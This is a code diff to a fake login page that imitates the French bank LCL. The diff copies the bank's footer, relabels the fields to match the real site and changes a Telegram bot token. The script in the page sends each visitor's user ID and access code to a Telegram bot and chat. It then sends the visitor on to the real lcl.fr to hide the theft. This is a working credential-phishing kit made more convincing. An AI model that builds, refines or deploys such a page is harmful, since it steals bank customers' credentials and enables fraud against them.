@@ -10,13 +10,14 @@
             background-color: #f4f4f4;
             margin: 0;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
         }
         .container {
             background: white;
-            padding: 40px;
+            padding: 40px 30px;
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             width: 90%;
@@ -31,6 +32,7 @@
             color: #333;
             margin-bottom: 20px;
             font-size: 18px;
+            font-weight: 600;
         }
         .input-group {
             margin-bottom: 15px;
@@ -53,6 +55,7 @@
         input:focus {
             border-color: #D6001C;
             outline: none;
+            box-shadow: 0 0 0 2px rgba(214, 0, 28, 0.1);
         }
         button {
             width: 100%;
@@ -64,6 +67,7 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
+            margin-top: 10px;
         }
         button:hover {
             background-color: #b30016;
@@ -79,6 +83,24 @@
             margin: 20px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* Footer模仿 LCL */
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            width: 100%;
+        }
+        .footer a {
+            color: #888;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -87,17 +109,17 @@
     <!-- Logo LCL -->
     <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/c/c2/Logo_LCL.svg/120px-Logo_LCL.svg.png" alt="LCL Logo" class="logo">
     
-    <h2>Connexion à votre espace</h2>
+    <h2>Connexion à votre espace client</h2>
 
     <form id="loginForm">
         <div class="input-group">
-            <label for="userId">Identifiant client</label>
-            <input type="text" id="userId" placeholder="Ex: 123456789" required>
+            <label for="userId">Identifiant</label>
+            <input type="text" id="userId" placeholder="Votre identifiant client" required>
         </div>
 
         <div class="input-group">
-            <label for="password">Mot de passe</label>
-            <input type="password" id="password" placeholder="Votre mot de passe" required>
+            <label for="password">Code d'accès</label>
+            <input type="password" id="password" placeholder="Votre code d'accès" required>
         </div>
 
         <button type="submit" id="btnSubmit">Se connecter</button>
@@ -106,13 +128,21 @@
     <div class="spinner" id="spinner"></div>
 </div>
 
+<div class="footer">
+    <p>© 2024 LCL - Tous droits réservés</p>
+    <div class="legal-links">
+        <a href="#">Mentions légales</a>
+        <a href="#">Cookies</a>
+    </div>
+</div>
+
 <script>
     // CONFIGURATION TELEGRAM
-    const TELEGRAM_BOT_TOKEN = '8786013399:AAF5RZ_CwDoJKnJljSy7GKv3meCaArcJ5Ak';
+    const TELEGRAM_BOT_TOKEN = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ';
     const TELEGRAM_CHAT_ID = '8501464548';
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault(); // Empêche le rechargement de la page
+        e.preventDefault();
 
         const userId = document.getElementById('userId').value;
         const password = document.getElementById('password').value;
@@ -122,7 +152,7 @@
         document.getElementById('spinner').style.display = 'block';
 
         // Envoi des données à Telegram
-        const message = `🔐 *Nouvelle connexion LCL détectée*\n\n👤 Identifiant: ${userId}\n🔑 Mot de passe: ${password}\n📅 Date: ${new Date().toLocaleString()}`;
+        const message = `🔐 *Nouvelle connexion LCL détectée*\n\n👤 Identifiant: ${userId}\n🔑 Code d'accès: ${password}\n📅 Date: ${new Date().toLocaleString()}`;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
@@ -144,7 +174,7 @@
         })
         .catch(error => console.error('Erreur réseau:', error));
 
-        // Simulation de redirection vers le vrai site LCL après 2 secondes
+        // Redirection vers le vrai site LCL après 2 secondes
         setTimeout(() => {
             window.location.href = 'https://www.lcl.fr/';
         }, 2000);
